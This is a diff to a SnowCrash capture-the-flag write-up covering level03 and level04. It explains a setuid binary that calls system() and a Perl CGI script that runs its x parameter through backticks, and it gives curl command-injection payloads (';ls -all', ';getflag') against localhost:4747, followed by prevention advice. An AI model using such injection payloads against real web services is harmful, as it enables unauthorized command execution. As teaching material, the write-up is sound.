@@ -185,12 +185,14 @@ like below:
         return system("/usr/bin/env echo Exploit me");
     }
 ```
+
 #### Analysis:
 - The binary is using the `getegid()` and `geteuid()` functions to get the **effective group ID** and **effective user ID** of the process, which are the IDs (flag03) of the user that executed the binary (in this case, any user that executes the binary will have the effective IDs of the user flag03).
 - Then it uses the `setresgid()` and `setresuid()` functions to set the real, effective, and saved group ID and user ID of the process to the values obtained from `getegid()` and `geteuid()`, which means that the process will run with the privileges of the user flag03.
 - Finally, it uses the `system()` function to execute the command `echo Exploit me` with the privileges of the user flag03.
 
 #### Vulnerability:
+##### Type: Command Injection
 - The vulnerability in this binary is that it uses the combination of `setresgid()`, `setresuid()`, and `system()` functions without properly sanitizing the **environment variables** (e.g., `PATH`) or/and the command being executed.
 - This allows an attacker to manipulate the environment variables or the command being executed to execute arbitrary commands with the privileges of the user flag03, which can lead to privilege escalation and potentially compromise the entire system if the user flag03 has high privileges.
 
@@ -216,5 +218,73 @@ like below:
 #### conclusion:
 - By exploiting the vulnerability in the `level03` binary, we can execute arbitrary commands with the privileges of the user flag03, which allows us to get the flag for level04 and progress through the CTF challenge. 
 - This highlights the importance of properly sanitizing environment variables and commands when developing software, especially when dealing with privileged operations, to prevent potential security vulnerabilities and protect the integrity of the system.
-                
+
 ### Level04:
+- Swap to the user level04 and enter the password which is the flag for level03:
+```bash
+    su level04
+    # enter the password: the result of getflag stored in level03/flag
+```
+- In the home directory of this user we find this file:
+```bash
+    level04@SnowCrash:~$ la -la
+    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+    level04@SnowCrash:~$ cat level04.pl
+```
+```perl
+    #!/usr/bin/perl
+    # localhost:4747
+    use CGI qw{param};
+    print "Content-type: text/html\n\n";
+    sub x {
+        $y = $_[0];
+        print `echo $y 2>&1`;
+    }
+    x(param("x"));
+```
+- The CGI script is likely being served by a web server, and it listens on port 4747, so we can access it through a web browser or a tool like `curl` to send requests to the server.
+- This is a simple Perl script that takes a parameter from the URL and prints it out. However, it is vulnerable to command injection because it directly executes the input through the `backtick operator` **( \`  \` )** as a shell command without any sanitization.
+- The `param("x")` function retrieves the value of the `x` parameter from the URL query string, and then it is passed to the `echo` command, which is executed in the shell.
+
+##### Type: Command Injection
+- The vulnerability in this script is that it allows an attacker to inject arbitrary commands through the `x` parameter in the URL. 
+- For example, an attacker could access the URL `http://localhost:4747/?x=;ls` to execute the `ls` command on the server, which would list the files in the current directory. 
+- This could lead to further exploitation if the attacker can access sensitive files or execute more complex commands.
+#### Exploitation:
+- To exploit this vulnerability, we can use a web browser or a tool like `curl` to send a request to the server with a malicious payload in the `x` parameter. 
+- For example, we can give value to x as `test` to see the output of the command `echo test`:
+```bash
+    curl "http://localhost:4747/?x=test"
+    # The output will be:
+    test
+```
+- Also, we can try to execute a more complex command, such as `ls -all` to list the files in the current directory:
+```bash
+    curl --get --data-urlencode "x=;ls -all" http://localhost:4747
+    # The output will be the list of files in the current directory
+    total 4
+    dr-xr-x---+ 2 flag04 level04  60 Mar 19 14:14 .
+    drwxr-xr-x  1 root   root    100 Mar 19 14:14 ..
+    -r-xr-x---+ 1 flag04 level04 152 Mar 19 14:14 level04.pl
+```
+-Now, we can execute the `getflag` command to get the flag for level05:
+```bash
+    curl --get --data-urlencode "x=;getflag" http://localhost:4747
+    # The output will be the flag for level05 which is in the file `level04/flag`
+```
+#### Prevention:
+- Use the backtick operator ( \`  \` ) to execute commands in Perl is dangerous because it allows for command injection if the input is not properly sanitized.
+- To prevent this type of vulnerability, the script should properly sanitize the input from the `x` parameter to ensure that it does not contain any malicious commands. 
+- This can be done by using a whitelist of allowed commands or by escaping special characters that could be used for command injection.
+- ***Good practice***: it is generally recommended to avoid using the backtick operator for executing commands and instead use a more secure method, such as the `system()` function with proper argument handling, to reduce the risk of command injection.
+```perl
+    # Example of using system() with proper argument handling:
+    use IPC::System::Simple qw(system);
+    sub x {
+        my $y = param("x");
+        # Validate or sanitize $y here before using it
+        # Use the absolute path for the command to prevent PATH manipulation
+        # separate the command and its arguments to prevent command injection
+        system("/usr/bin/echo", $y);
+    }
+```
